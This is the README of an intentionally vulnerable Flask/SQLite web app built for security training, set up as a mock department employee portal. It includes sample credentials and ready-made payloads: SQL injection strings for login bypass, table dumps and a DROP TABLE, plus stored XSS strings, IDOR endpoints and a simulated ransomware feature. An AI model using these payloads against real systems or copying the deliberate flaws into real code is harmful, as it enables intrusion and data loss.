# CS Department Employee Portal — Vulnerable App (SQLite)

## ⚠ FOR SECURITY TRAINING PURPOSES ONLY

A fully functional Flask + SQLite web application intentionally designed
with real, exploitable security vulnerabilities.

## Stack
- **Backend**: Python 3 + Flask
- **Database**: SQLite (real queries — not simulated)
- **Frontend**: Vanilla HTML/CSS/JS served by Flask

## Setup & Run

```bash
pip install flask
python app.py
```
Then open: http://localhost:5050

## Credentials
| Username | Password |
|----------|----------|
| admin    | admin123 |
| karim    | karim2024|
| fatima   | fatima99 |

## Vulnerabilities

### 1. SQL Injection (Login + Search)
**Login bypass:**
```
Username: admin' --
Password: anything
```
**Search — dump all rows:**
```
' OR '1'='1
```
**Search — UNION attack (dump users table into results):**
```
' UNION SELECT id,username,password,password,password,password,password,password,password,datetime('now') FROM users--
```
**Search — destructive:**
```
'; DROP TABLE employees; --
```

### 2. Stored XSS
Register an employee with this as their name:
```html
<img src=x onerror=alert('XSS from SQLite')>
```
Post a comment with:
```html
<script>document.title="HACKED"</script>
```
The payload is stored in SQLite and executes for every user who views the page.

### 3. IDOR (Insecure Direct Object Reference)
Direct API access with no auth check:
```
GET /api/employees/1
GET /api/employees/2
...
```

### 4. Broken Authentication
- Passwords stored and returned in plaintext from SQLite
- No bcrypt / hashing
- Login SQL is interpolated directly (enables SQLi bypass)

### 5. Ransomware Simulation
File Manager → "Run Ransomware Payload" encrypts all filenames in the
`files` SQLite table to base64.locked format and shows a ransom screen.

### 6. No Input Validation
All POST endpoints accept any string — no length limits, type checks,
or sanitization on any field.

## Vulnerable API Endpoints
| Method | Endpoint | Vulnerability |
|--------|----------|---------------|
| POST | /api/login | SQL Injection |
| GET | /api/search?q= | SQL Injection |
| GET | /api/employees | No auth check |
| GET | /api/employees/:id | IDOR |
| POST | /api/employees | No validation, Stored XSS |
| DELETE | /api/employees/:id | No auth, no audit log |
| POST | /api/comments | Stored XSS |
| POST | /api/files/encrypt | Ransomware sim |
